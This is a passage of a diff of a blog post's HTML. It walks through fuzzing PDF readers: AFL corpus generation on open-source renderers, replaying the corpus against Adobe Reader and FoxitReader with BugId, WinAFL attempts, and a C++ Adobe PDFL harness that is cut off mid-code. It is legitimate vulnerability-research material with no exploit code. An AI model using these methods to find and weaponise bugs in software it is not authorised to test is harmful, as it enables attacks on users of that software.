+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mkdir </span>build <span class="o">&amp;&amp;</span> <span class="nb">cd </span>build <span class="o">&amp;&amp;</span> <span class="nv">CC</span><span class="o">=</span>afl-clang-fast <span class="nv">CXX</span><span class="o">=</span>afl-clang-fast++ cmake <span class="nt">-DCMAKE_BUILD_TYPE</span><span class="o">=</span>Release .. <span class="o">&amp;&amp;</span> <span class="nv">USE_ASAN</span><span class="o">=</span>1 <span class="nv">AFL_HARDEN</span><span class="o">=</span>1 make</code></pre></figure>
 
-&lt;ul&gt;
-  &lt;li&gt;Place your input files in /dev/shm/in-raw. You should start with a nice input corpus, for instance, get some files from https://github.com/mozilla/pdf.js/tree/master/test/pdfs&lt;/li&gt;
-  &lt;li&gt;You need to isolate unique inputs, no reason to fuzz inputs that offer the same code paths. We do this by asking afl to minimize the input corpus for us:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;afl-cmin &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-raw&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; xpdf-4.00/build/xpdf/pdftoppm &lt;span class=&quot;nt&quot;&gt;-mono&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 1 @@ -&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<ul>
+  <li>Place your input files in /dev/shm/in-raw. You should start with a nice input corpus, for instance, get some files from https://github.com/mozilla/pdf.js/tree/master/test/pdfs</li>
+  <li>You need to isolate unique inputs, no reason to fuzz inputs that offer the same code paths. We do this by asking afl to minimize the input corpus for us:</li>
+</ul>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">afl-cmin <span class="nt">-i</span> <span class="k">in</span><span class="nt">-raw</span> <span class="nt">-o</span> <span class="k">in</span> <span class="nt">--</span> xpdf-4.00/build/xpdf/pdftoppm <span class="nt">-mono</span> <span class="nt">-r</span> 1 @@ -</code></pre></figure>
 
-&lt;ul&gt;
-  &lt;li&gt;Now you could also minimize each file using afl-tmin if you feel like it. If you don’t then because of the way afl works at least you should probably do something like:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;find &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;/ &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-size&lt;/span&gt; +10k &lt;span class=&quot;nt&quot;&gt;-delete&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<ul>
+  <li>Now you could also minimize each file using afl-tmin if you feel like it. If you don’t then because of the way afl works at least you should probably do something like:</li>
+</ul>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">find <span class="k">in</span>/ <span class="nt">-type</span> f <span class="nt">-size</span> +10k <span class="nt">-delete</span></code></pre></figure>
 
-&lt;ul&gt;
-  &lt;li&gt;Now run your fuzzer from within screen or tmux and run as many fuzzers as you have cores available! You can verify you’re on the right track using afl-gotcpu.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;afl-fuzz &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; out &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/share/afl/dictionaries/pdf.dict &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; master &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; xpdf-4.00/build/xpdf/pdftoppm &lt;span class=&quot;nt&quot;&gt;-mono&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 1 @@ -&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<ul>
+  <li>Now run your fuzzer from within screen or tmux and run as many fuzzers as you have cores available! You can verify you’re on the right track using afl-gotcpu.</li>
+</ul>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">afl-fuzz <span class="nt">-i</span> <span class="k">in</span> <span class="nt">-o</span> out <span class="nt">-x</span> /usr/share/afl/dictionaries/pdf.dict <span class="nt">-M</span> master <span class="nt">--</span> xpdf-4.00/build/xpdf/pdftoppm <span class="nt">-mono</span> <span class="nt">-r</span> 1 @@ -</code></pre></figure>
 
-&lt;ul&gt;
-  &lt;li&gt;Notice the command line I’m using with pdftoppm: -mono -r 1 really speeds things up. Furthermore I use the afl provided dictionary which helps afl learn the PDF format much faster. The @@ will be replaced by afl with the generated inputs. Replace -M master with -S slave1, -S slave2 etc for each core.&lt;/li&gt;
-  &lt;li&gt;Don’t forget to setup a cronjob that backups your corpus from /dev/shm to persistent storage. A simple crash of your vm will otherwise make you start over!&lt;/li&gt;
-  &lt;li&gt;Note: you may be able to leverage afl’s persistent mode which will make the fuzzing even faster by looping the actual rendering functions. Look into it, the docs are very good.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>Notice the command line I’m using with pdftoppm: -mono -r 1 really speeds things up. Furthermore I use the afl provided dictionary which helps afl learn the PDF format much faster. The @@ will be replaced by afl with the generated inputs. Replace -M master with -S slave1, -S slave2 etc for each core.</li>
+  <li>Don’t forget to setup a cronjob that backups your corpus from /dev/shm to persistent storage. A simple crash of your vm will otherwise make you start over!</li>
+  <li>Note: you may be able to leverage afl’s persistent mode which will make the fuzzing even faster by looping the actual rendering functions. Look into it, the docs are very good.</li>
+</ul>
 
-&lt;p&gt;On a 6 core Xeon vm I was able to get about 1200 executions per second on xpdf, 4000 on mupdf and 20 on ghostscript (lol). You can get a nice summary view using afl-whatsup.&lt;/p&gt;
+<p>On a 6 core Xeon vm I was able to get about 1200 executions per second on xpdf, 4000 on mupdf and 20 on ghostscript (lol). You can get a nice summary view using afl-whatsup.</p>
 
-&lt;h2 id=&quot;throwing-the-open-source-pdf-corpus-at-adobe-reader&quot;&gt;Throwing the open source PDF corpus at Adobe Reader&lt;/h2&gt;
-&lt;p&gt;Running these 3 fuzzers for about 6 weeks got me a corpus of 500k pdf files. Now there’s a couple of things we need to take care of before we can do a proper test run. First of all, you’ll have 3 servers with /dev/shm/out/ populated with subdirectories queue, crashes, hangs (each per master/slave). Copy the out directories over to your local machine or vm and use some Unix foo to join them all together into a single directory with unique filenames. Something like this should do the trick:&lt;/p&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'id*'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-size&lt;/span&gt; +0 | gawk &lt;span class=&quot;s1&quot;&gt;'BEGIN{ a=1 }{ printf &quot;cp \&quot;%s\&quot; ../%08d.pdf\n&quot;, $0, a++ }'&lt;/span&gt; | bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<h2 id="throwing-the-open-source-pdf-corpus-at-adobe-reader">Throwing the open source PDF corpus at Adobe Reader</h2>
+<p>Running these 3 fuzzers for about 6 weeks got me a corpus of 500k pdf files. Now there’s a couple of things we need to take care of before we can do a proper test run. First of all, you’ll have 3 servers with /dev/shm/out/ populated with subdirectories queue, crashes, hangs (each per master/slave). Copy the out directories over to your local machine or vm and use some Unix foo to join them all together into a single directory with unique filenames. Something like this should do the trick:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"> find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'id*'</span> <span class="nt">-size</span> +0 | gawk <span class="s1">'BEGIN{ a=1 }{ printf "cp \"%s\" ../%08d.pdf\n", $0, a++ }'</span> | bash</code></pre></figure>
 
-&lt;p&gt;Now create a Windows batch file that will loop through all your files and launch Adobe Reader, for example:&lt;/p&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-batch&quot; data-lang=&quot;batch&quot;&gt;for %%f in (y:\*.pdf) do AcroRd32 %%f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<p>Now create a Windows batch file that will loop through all your files and launch Adobe Reader, for example:</p>
+<figure class="highlight"><pre><code class="language-batch" data-lang="batch"><span class="k">for</span> <span class="vm">%%f</span> <span class="k">in</span> <span class="o">(</span><span class="kd">y</span>:\<span class="o">*</span>.pdf<span class="o">)</span> <span class="k">do</span> <span class="kd">AcroRd32</span> <span class="vm">%%f</span></code></pre></figure>
 
-&lt;p&gt;You can run this from your Windows vm. You’ll also need to code a popup killer script using AutoIt which will close popups like “This PDF is corrupted”. And since you cannot add a timeout to this setup, you’ll have to manually close the Reader window every single time… Right.&lt;/p&gt;
+<p>You can run this from your Windows vm. You’ll also need to code a popup killer script using AutoIt which will close popups like “This PDF is corrupted”. And since you cannot add a timeout to this setup, you’ll have to manually close the Reader window every single time… Right.</p>
 
-&lt;p&gt;How can we improve on this? Simply use BugId by @berendjanwever. It will output html reports for you and you can add timeouts. The batch file would now look like this and you’re all set:&lt;/p&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-batch&quot; data-lang=&quot;batch&quot;&gt;for %%f in (y:\*.pdf) do bugid acrobatdc --nApplicationMaxRunTime=15 -- &quot;%%f&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<p>How can we improve on this? Simply use BugId by @berendjanwever. It will output html reports for you and you can add timeouts. The batch file would now look like this and you’re all set:</p>
+<figure class="highlight"><pre><code class="language-batch" data-lang="batch"><span class="k">for</span> <span class="vm">%%f</span> <span class="k">in</span> <span class="o">(</span><span class="kd">y</span>:\<span class="o">*</span>.pdf<span class="o">)</span> <span class="k">do</span> <span class="kd">bugid</span> <span class="kd">acrobatdc</span> <span class="na">--nApplicationMaxRunTime</span><span class="o">=</span><span class="m">15</span> <span class="o">--</span> <span class="s2">"</span><span class="vm">%%f</span><span class="s2">"</span></code></pre></figure>
 
-&lt;p&gt;Notice that BugId will suggest enabling full pageheap for your target, and you should when testing/fuzzing targets. It will offer to set it for you. You can also use gflags for this purpose to set it yourself. Having pageheap enabled will make you find more bugs. Don’t forget to disable it again when building your exploits.&lt;/p&gt;
+<p>Notice that BugId will suggest enabling full pageheap for your target, and you should when testing/fuzzing targets. It will offer to set it for you. You can also use gflags for this purpose to set it yourself. Having pageheap enabled will make you find more bugs. Don’t forget to disable it again when building your exploits.</p>
 
-&lt;p&gt;Again I suggest you deploy the whole thing on a cloud vm so you can close your laptop screen while it’s running in the background. And while you’re at it why not run the exact same setup for FoxitReader as well in parallel?&lt;/p&gt;
+<p>Again I suggest you deploy the whole thing on a cloud vm so you can close your laptop screen while it’s running in the background. And while you’re at it why not run the exact same setup for FoxitReader as well in parallel?</p>
 
-&lt;p&gt;For me, this 500k corpus did not do much with Adobe Reader (as in no crashes at all, a couple of hangs). It did crash FoxitReader though, but those crashes were commonly agreed upon not to be exploitable. Bugs are not necessarily vulnerabilities.&lt;/p&gt;
+<p>For me, this 500k corpus did not do much with Adobe Reader (as in no crashes at all, a couple of hangs). It did crash FoxitReader though, but those crashes were commonly agreed upon not to be exploitable. Bugs are not necessarily vulnerabilities.</p>
 
-&lt;h2 id=&quot;winafl-fuzzing-adobe-reader-itself&quot;&gt;(Win)AFL fuzzing Adobe Reader itself&lt;/h2&gt;
-&lt;p&gt;The open source PDF corpus did not contain any inputs that triggered a vuln in Adobe Reader or FoxitReader.&lt;/p&gt;
+<h2 id="winafl-fuzzing-adobe-reader-itself">(Win)AFL fuzzing Adobe Reader itself</h2>
+<p>The open source PDF corpus did not contain any inputs that triggered a vuln in Adobe Reader or FoxitReader.</p>
 
-&lt;p&gt;Next!&lt;/p&gt;
+<p>Next!</p>
 
-&lt;p&gt;Wouldn’t it be cool to use afl on Adobe Reader itself? It might be slow, but a crash would then be a true crash on our final target. Adobe Reader runs on Windows and macOS. I’m a Linux user so I started out with a local Windows 8 VM with Adobe Reader DC installed. No need to install Windows 10 I figured because that might just over complicate things with even more mitigations up front. You’ll know by now that afl does not support Windows out of the box, but @ifsecure actually ported it by leveraging DynamoRIO and released WinAFL.&lt;/p&gt;
+<p>Wouldn’t it be cool to use afl on Adobe Reader itself? It might be slow, but a crash would then be a true crash on our final target. Adobe Reader runs on Windows and macOS. I’m a Linux user so I started out with a local Windows 8 VM with Adobe Reader DC installed. No need to install Windows 10 I figured because that might just over complicate things with even more mitigations up front. You’ll know by now that afl does not support Windows out of the box, but @ifsecure actually ported it by leveraging DynamoRIO and released WinAFL.</p>
 
-&lt;p&gt;WinAFL will require you to specify a function name (given the target has symbols) or function offset, which you should find by reverse engineering your target application. The function should open your input, process it, close your input. WinAFL will run your target application and loop this function, again and again, each time restoring the state of memory as if it were the first run, replacing the input file meanwhile. This is a clever way to reach a high number of executions per second.&lt;/p&gt;
+<p>WinAFL will require you to specify a function name (given the target has symbols) or function offset, which you should find by reverse engineering your target application. The function should open your input, process it, close your input. WinAFL will run your target application and loop this function, again and again, each time restoring the state of memory as if it were the first run, replacing the input file meanwhile. This is a clever way to reach a high number of executions per second.</p>
 
-&lt;p&gt;So I tried WinAFL on an easy target first: unrar.exe, a small CLI application. This seems to work great. Load unrar.exe in a disassembler and find your offset and number of args. Populate a small input corpus and run WinAFL. For example:&lt;/p&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-batch&quot; data-lang=&quot;batch&quot;&gt;c:\research\winafl\bin64\afl-fuzz.exe -t 1000+ -i c:\research\unrar\in -o c:\research\unrar\out -D C:\research\dr\bin64 -- -fuzz_iterations 5000 -target_module unrar.exe -nargs 3 -target_offset 0xE864 -coverage_module unrar.exe -- unrar.exe p @@&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<p>So I tried WinAFL on an easy target first: unrar.exe, a small CLI application. This seems to work great. Load unrar.exe in a disassembler and find your offset and number of args. Populate a small input corpus and run WinAFL. For example:</p>
+<figure class="highlight"><pre><code class="language-batch" data-lang="batch"><span class="kd">c</span>:\research\winafl\bin64\afl<span class="na">-fuzz</span>.exe <span class="na">-t </span><span class="m">1000</span><span class="o">+</span> <span class="na">-i </span><span class="kd">c</span>:\research\unrar\in <span class="na">-o </span><span class="kd">c</span>:\research\unrar\out <span class="na">-D </span><span class="kd">C</span>:\research\dr\bin64 <span class="o">--</span> <span class="na">-fuzz</span>_iterations <span class="m">5000</span> <span class="na">-target</span>_module <span class="kd">unrar</span><span class="err">.exe</span> <span class="na">-nargs </span><span class="m">3</span> <span class="na">-target</span>_offset <span class="mh">0xE864</span> <span class="na">-coverage</span>_module <span class="kd">unrar</span><span class="err">.exe</span> <span class="o">--</span> <span class="kd">unrar</span><span class="err">.exe</span> <span class="kd">p</span> @@</code></pre></figure>
 
-&lt;p&gt;For the more complex apps like Adobe Reader and FoxitReader, I wasn’t able to get things going this easily.&lt;/p&gt;
+<p>For the more complex apps like Adobe Reader and FoxitReader, I wasn’t able to get things going this easily.</p>
 
-&lt;h3 id=&quot;attempt-1-harness-acrord32dll&quot;&gt;Attempt 1: Harness AcroRd32.dll&lt;/h3&gt;
-&lt;p&gt;When your disassemble Adobe Reader (I focussed on AcroRd32.dll) you’ll find some references to PDDoc. This made me think: how about coding a harness which does a LoadLibrary on AcroRd32.dll and using GetProcAddress call the methods that open and process a PDF document.&lt;/p&gt;
+<h3 id="attempt-1-harness-acrord32dll">Attempt 1: Harness AcroRd32.dll</h3>
+<p>When your disassemble Adobe Reader (I focussed on AcroRd32.dll) you’ll find some references to PDDoc. This made me think: how about coding a harness which does a LoadLibrary on AcroRd32.dll and using GetProcAddress call the methods that open and process a PDF document.</p>
 
-&lt;p&gt;That didn’t work out: the number of args did not match the number of args I could find in a couple of online Adobe SDK resources. Furthermore, I had too much trouble figuring out all the crazy data structures you need to put in place.&lt;/p&gt;
+<p>That didn’t work out: the number of args did not match the number of args I could find in a couple of online Adobe SDK resources. Furthermore, I had too much trouble figuring out all the crazy data structures you need to put in place.</p>
 
-&lt;p&gt;Trial and error kept resulting in error. My harness.cpp is now in the trash.&lt;/p&gt;
+<p>Trial and error kept resulting in error. My harness.cpp is now in the trash.</p>
 
-&lt;h3 id=&quot;attempt-2-harness-jp2klibdll&quot;&gt;Attempt 2: Harness JP2KLib.dll&lt;/h3&gt;
-&lt;p&gt;This dll is responsible for rendering JPEG2000 files, so what if we can focus on just that part of the PDF processing? Well, again, I hit the wall in trying to figure out the way JP2KLib.dll works. Making use of API call spying software did not help either (no symbols, just huge structures).&lt;/p&gt;
+<h3 id="attempt-2-harness-jp2klibdll">Attempt 2: Harness JP2KLib.dll</h3>
+<p>This dll is responsible for rendering JPEG2000 files, so what if we can focus on just that part of the PDF processing? Well, again, I hit the wall in trying to figure out the way JP2KLib.dll works. Making use of API call spying software did not help either (no symbols, just huge structures).</p>
 
-&lt;p&gt;Next!&lt;/p&gt;
+<p>Next!</p>
 
-&lt;h3 id=&quot;attempt-3-find-an-offset-for-winafl-to-target-the-real-thing&quot;&gt;Attempt 3: Find an offset for WinAFL to target the real thing&lt;/h3&gt;
-&lt;p&gt;I put in quite some time and effort to find a fuzzable function in AcroRd32.exe and .dll.&lt;/p&gt;
+<h3 id="attempt-3-find-an-offset-for-winafl-to-target-the-real-thing">Attempt 3: Find an offset for WinAFL to target the real thing</h3>
+<p>I put in quite some time and effort to find a fuzzable function in AcroRd32.exe and .dll.</p>
 
-&lt;p&gt;But even if you could find one that meets all WinAFL’s requirements of such a method, by the time you try to fuzz it with WinAFL you’ll find out it cannot cover code running in child processes. And Adobe Reader spawns a child process that does the heavy lifting.&lt;/p&gt;
+<p>But even if you could find one that meets all WinAFL’s requirements of such a method, by the time you try to fuzz it with WinAFL you’ll find out it cannot cover code running in child processes. And Adobe Reader spawns a child process that does the heavy lifting.</p>
 
-&lt;p&gt;You can confirm this yourself by loading Reader in WinDbg and on the initial break apply .childdbg 1. On subsequent breaks, you can check out loaded modules, switch between the processes, etc.&lt;/p&gt;
+<p>You can confirm this yourself by loading Reader in WinDbg and on the initial break apply .childdbg 1. On subsequent breaks, you can check out loaded modules, switch between the processes, etc.</p>
 
-&lt;p&gt;Not sure even if child coverage would be possible you’ll be able to provide WinAFL with a proper target function. It needs to open your input, render it, and close it immediately to free resources so WinAFL can put a new input in place and repeat. I don’t think such a function is built into Adobe Reader :-) Perhaps… coding a custom plugin? Then have the fuzzer cover AcroRd32.dll but target your plugin function. I did not investigate this path further.&lt;/p&gt;
+<p>Not sure even if child coverage would be possible you’ll be able to provide WinAFL with a proper target function. It needs to open your input, render it, and close it immediately to free resources so WinAFL can put a new input in place and repeat. I don’t think such a function is built into Adobe Reader :-) Perhaps… coding a custom plugin? Then have the fuzzer cover AcroRd32.dll but target your plugin function. I did not investigate this path further.</p>
 
-&lt;h2 id=&quot;harnessing-the-pdf-libraries&quot;&gt;Harnessing the PDF Libraries&lt;/h2&gt;
-&lt;p&gt;Browsing Adobe’s and Foxit’s websites you’ll find out there are actually SDK’s you can download and use. This gave me the idea you can write your own harness that simply renders a given input PDF in memory using the engine exposed by the SDK. Odds are this is the exact same engine as the actual Reader uses to do the rendering.&lt;/p&gt;
+<h2 id="harnessing-the-pdf-libraries">Harnessing the PDF Libraries</h2>
+<p>Browsing Adobe’s and Foxit’s websites you’ll find out there are actually SDK’s you can download and use. This gave me the idea you can write your own harness that simply renders a given input PDF in memory using the engine exposed by the SDK. Odds are this is the exact same engine as the actual Reader uses to do the rendering.</p>
 
-&lt;p&gt;First of all you need to get a copy of the Adobe and/or Foxit SDK’s. Note these SDK’s are available as evaluation packages.&lt;/p&gt;
+<p>First of all you need to get a copy of the Adobe and/or Foxit SDK’s. Note these SDK’s are available as evaluation packages.</p>
 
-&lt;p&gt;Here’s the C++ code for the Adobe PDFL harness I made and used to fuzz the rendering engine:&lt;/p&gt;
+<p>Here’s the C++ code for the Adobe PDFL harness I made and used to fuzz the rendering engine:</p>
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c--&quot; data-lang=&quot;c++&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ***************************************************************************************************&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// Harness.cpp leverages the Adobe PDFL libs to render (in-mem) every page of a given pdf.&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// Features a public fuzz method which can be used as target method in WinAFL&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// Based on the open source RenderPage DataLogic PDFL example from github:&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// https://github.com/datalogics/adobe-pdf-library-samples/tree/master/CPlusPlus/Sample_Source/&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// Confirm render timing: powershell -Command &quot;Measure-Command {./harness.exe test.pdf | Out-Default}&quot;&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// (c) kciredor 2018&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// ***************************************************************************************************&lt;/span&gt;
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="c1">// ***************************************************************************************************</span>
+<span class="c1">//</span>
+<span class="c1">// Harness.cpp leverages the Adobe PDFL libs to render (in-mem) every page of a given pdf.</span>
+<span class="c1">// Features a public fuzz method which can be used as target method in WinAFL</span>
+<span class="c1">//</span>
+<span class="c1">// Based on the open source RenderPage DataLogic PDFL example from github:</span>
+<span class="c1">// https://github.com/datalogics/adobe-pdf-library-samples/tree/master/CPlusPlus/Sample_Source/</span>
+<span class="c1">//</span>
+<span class="c1">// Confirm render timing: powershell -Command "Measure-Command {./harness.exe test.pdf | Out-Default}"</span>
+<span class="c1">//</span>
+<span class="c1">// (c) kciredor 2018</span>
+<span class="c1">//</span>
+<span class="c1">// ***************************************************************************************************</span>
 
-&lt;span class=&quot;cp&quot;&gt;#include &quot;APDFLDoc.h&quot;
-#include &quot;InitializeLibrary.h&quot;
-&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;#include &quot;RenderPage.h&quot;
-&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;#define RESOLUTION  110.0
-#define COLORSPACE  &quot;DeviceRGB&quot;
-#define FILTER      &quot;DCTDecode&quot;
+<span class="cp">#include</span> <span class="cpf">"APDFLDoc.h"</span><span class="cp">
+#include</span> <span class="cpf">"InitializeLibrary.h"</span><span class="cp">
+</span>
+<span class="cp">#include</span> <span class="cpf">"RenderPage.h"</span><span class="cp">
+</span>
+<span class="cp">#define RESOLUTION  110.0
+#define COLORSPACE  "DeviceRGB"
+#define FILTER      "DCTDecode"
 #define BPC         8
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__declspec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dllexport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fuzz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+</span>
+<span class="k">extern</span> <span class="s">"C"</span> <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="nf">fuzz</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">fn</span><span class="p">);</span>
 
-&lt;span class=&quot;n&quot;&gt;APDFLib&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+<span class="n">APDFLib</span> <span class="n">libInit</span><span class="p">;</span>
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fuzz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Rendering &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; - Res &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RESOLUTION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;, Colorspace &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COLORSPACE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;, Filter &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;, BPC &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+<span class="kt">void</span> <span class="nf">fuzz</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">fn</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Rendering "</span> <span class="o">&lt;&lt;</span> <span class="n">fn</span> <span class="o">&lt;&lt;</span> <span class="s">" - Res "</span> <span class="o">&lt;&lt;</span> <span class="n">RESOLUTION</span> <span class="o">&lt;&lt;</span> <span class="s">", Colorspace "</span> <span class="o">&lt;&lt;</span> <span class="n">COLORSPACE</span> <span class="o">&lt;&lt;</span> <span class="s">", Filter "</span> <span class="o">&lt;&lt;</span> <span class="n">FILTER</span> <span class="o">&lt;&lt;</span> <span class="s">", BPC "</span> <span class="o">&lt;&lt;</span> <span class="n">BPC</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 
-    &lt;span class=&quot;n&quot;&gt;DURING&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;APDFLDoc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdfDoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    <span class="n">DURING</span>
+        <span class="n">APDFLDoc</span> <span class="n">pdfDoc</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
     
